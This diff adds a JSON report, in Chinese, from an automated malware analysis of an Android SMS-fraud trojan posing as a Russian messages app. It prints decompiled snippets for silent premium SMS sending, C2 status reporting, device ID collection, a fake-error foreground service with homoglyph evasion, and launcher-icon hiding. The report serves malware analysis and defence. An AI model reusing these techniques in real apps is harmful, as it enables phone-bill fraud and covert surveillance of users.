@@ -1,0 +1,174 @@
+{
+  "APK信息": {
+    "文件名": "374fe677f0d7d405c390534c340c0e43d422deb6f089ab514ceec9221797403a.apk",
+    "sha256": "374fe677f0d7d405c390534c340c0e43d422deb6f089ab514ceec9221797403a",
+    "包名": "org.apple.shoot",
+    "应用名": "Пoсланиe",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 207.3
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "command"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\apple\\shoot\\Appear;",
+          "method_signature": "a(Context context, Intent intent)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "new c(context, 3).a(\"id\", intent.getStringExtra(\"id\")).a(\"command\", Integer.valueOf(intent.getIntExtra(\"command\", 0))).a(\"post\", Boolean.valueOf(intent.getBooleanExtra(\"post\", true))).a(\"status\", Integer.valueOf(getResultCode())).a();",
+          "malicious_code_snippet_context": "  /* JADX INFO: loaded from: classes.dex */\n  public class Appear extends BroadcastReceiver {\n      private void a(Context context, Intent intent) {\n>>>         new c(context, 3).a(\"id\", intent.getStringExtra(\"id\")).a(\"command\", Integer.valueOf(intent.getIntExtra(\"command\", 0))).a(\"post\", Boolean.valueOf(intent.getBooleanExtra(\"post\", true))).a(\"status\", Integer.valueOf(getResultCode())).a();\n      }\n  \n      private Object[] a(Bundle bundle) {",
+          "behavior_description": "该代码位于继承BroadcastReceiver的Appear类中，监听短信发送结果广播（同类的b方法解析SMS PDU，证实与短信处理相关）。当短信发送动作完成后，从Intent中提取命令ID（id）、命令编号（command）、是否上报（post）等参数，连同广播结果码getResultCode()（表征短信发送成功/失败状态），通过类c（网络上报模块，模式3）以链式构造参数后调用.a()发起网络请求，将命令执行结果回传至远程C2服务器。数据流向：短信发送结果广播→提取命令ID/命令类型/执行状态→HTTP上报至C2服务器。这是典型的短信欺诈木马向C2服务器回报命令执行状态的远程控制通信行为，与厂商报告中该样本伪装成'Сообщениe(Messages)'进行短信欺诈的结论吻合。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\apple\\shoot\\b;",
+          "method_signature": "a(Context context, String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "try {\n    Chapter.a(true);\n    SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n} catch (Exception e) {\n}",
+          "malicious_code_snippet_context": "      }\n  \n      public static void a(Context context, String str, String str2, PendingIntent pendingIntent) {\n>>>         try {\n>>>             Chapter.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n>>>         } catch (Exception e) {\n>>>         }\n      }\n  \n      public static void a(Context context, boolean z) {",
+          "behavior_description": "该方法封装了静默短信发送功能：目标号码(str)和短信内容(str2)作为参数由外部传入（通常来自C2服务器指令或硬编码的增值服务号码），通过 SmsManager.getDefault().sendTextMessage() 在无任何用户界面和用户确认的情况下直接发送短信，且异常被空catch块静默吞掉以隐藏发送失败痕迹。结合同类的定时任务代码（setRepeating 每60秒触发）以及厂商报告确认该样本伪装成'信息'应用并利用AccessibilityService隐藏自身，该行为典型用于增值短信订阅欺诈/短信扣费，直接造成用户话费损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\apple\\shoot\\b;",
+          "method_signature": "c(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "return Settings.Secure.getString(context.getContentResolver(), \"android_id\");",
+          "malicious_code_snippet_context": "      }\n  \n      public static String c(Context context) {\n>>>         return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n      }\n  \n      private static void c(Context context, long j) {",
+          "behavior_description": "该方法通过 Settings.Secure.getString 从系统安全设置数据库中读取 ANDROID_ID 持久化设备标识符。数据流向：系统 Settings.Secure 存储（source）→ 读取 android_id 并返回给上层调用方（sink），供恶意程序生成设备唯一指纹、标识和追踪受害设备。结合厂商报告确认该样本为伪装成短信应用、滥用 AccessibilityService 的间谍类恶意软件，此标识符采集属于其设备指纹/受害者画像链路的一环。同文件中的 c(Context,long) 方法还以约10秒间隔静默拉起 LumpDiscreet Activity，佐证该类的隐蔽操作特征。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\apple\\shoot\\Cutting;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT >= 26) {\n    this.a.getClass().getMethod(\"createNotification\" + String.valueOf(\"Channel\"), NotificationChannel.class).invoke(this.a, new NotificationChannel(\"org.apple.shoot.EMPIRE\", \"Surface\", 1));\n    builder = new Notification.Builder(getApplicationContext(), \"org.apple.shoot.EMPIRE\");\n} else {\n    builder = new Notification.Builder(getApplicationContext());\n}\nbuilder.setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle(\"Оснoвной прoцеcс\").setContentText(\"Системa не корректнo рaботaeт, вам нeoбходимo включить доcтуп к стaтиcтикe для 'Оснoвной прoцеcс'\");\nstartForeground(368, builder.build());",
+          "malicious_code_snippet_context": "  \n      private void a() throws IllegalAccessException, InvocationTargetException {\n          Notification.Builder builder;\n>>>         if (Build.VERSION.SDK_INT >= 26) {\n>>>             this.a.getClass().getMethod(\"createNotification\" + String.valueOf(\"Channel\"), NotificationChannel.class).invoke(this.a, new NotificationChannel(\"org.apple.shoot.EMPIRE\", \"Surface\", 1));\n>>>             builder = new Notification.Builder(getApplicationContext(), \"org.apple.shoot.EMPIRE\");\n>>>         } else {\n>>>             builder = new Notification.Builder(getApplicationContext());\n>>>         }\n>>>         builder.setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle(\"Оснoвной прoцеcс\").setContentText(\"Системa не корректнo рaботaeт, вам нeoбходимo включить доcтуп к стaтистикe для 'Оснoвной прoцеcс'\").setWhen(System.currentTimeMillis());\n>>>         startForeground(368, builder.build());\n      }\n  \n      private void b() {",
+          "behavior_description": "该代码位于恶意样本的 Service 组件中，通过字符串拼接（\"createNotification\"+String.valueOf(\"Channel\")）反射调用 createNotificationChannel，刻意规避静态特征检测；随后构建一个伪装成系统错误的俄语通知（标题'Основной процесс'即'主进程'，内容谎称'系统运行不正常，您需要为主进程开启统计信息访问权限'，且文本中混用拉丁字母与西里尔字母如'Системa'进一步对抗字符串检测），最终调用 startForeground(368, builder.build()) 将服务提升为前台服务。数据流向：硬编码的欺骗性通知文本 → Notification.Builder 构建伪造系统通知 → startForeground() 前台保活。该行为一方面利用前台服务机制使恶意进程持续驻留内存、避免被系统回收，为后续 AccessibilityService 间谍行为提供持久化保障；另一方面通过伪造系统报错通知进行社会工程学欺骗，诱导用户授予危险权限，与 Zscaler 报告中该伪装成'Сообщениe（短信）'的间谍木马行为特征吻合。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lorg\\apple\\shoot\\CarveEavesdrop;",
+          "method_signature": "a()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) CarveEavesdrop.class), 2, 1);",
+          "malicious_code_snippet_context": "  /* JADX INFO: loaded from: classes.dex */\n  public class CarveEavesdrop extends Activity {\n      private void a() {\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) CarveEavesdrop.class), 2, 1);\n      }\n  \n      @Override // android.app.Activity",
+          "behavior_description": "该Activity在onCreate()中调用a()，通过PackageManager.setComponentEnabledSetting将自身组件设置为COMPONENT_ENABLED_STATE_DISABLED（参数2，DONT_KILL_APP=1），随后立即finish()关闭界面。数据流向：应用自身组件标识 ComponentName(getApplicationContext(), CarveEavesdrop.class) → setComponentEnabledSetting() 禁用该入口组件，使应用图标从桌面启动器中消失。这是典型的恶意软件自我隐藏手法，与厂商报告中该样本伪装为'Сообщениe(Messages)'并利用AccessibilityService实施监控的行为吻合，隐藏图标后用户难以察觉和卸载，为后续间谍行为提供隐蔽性。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
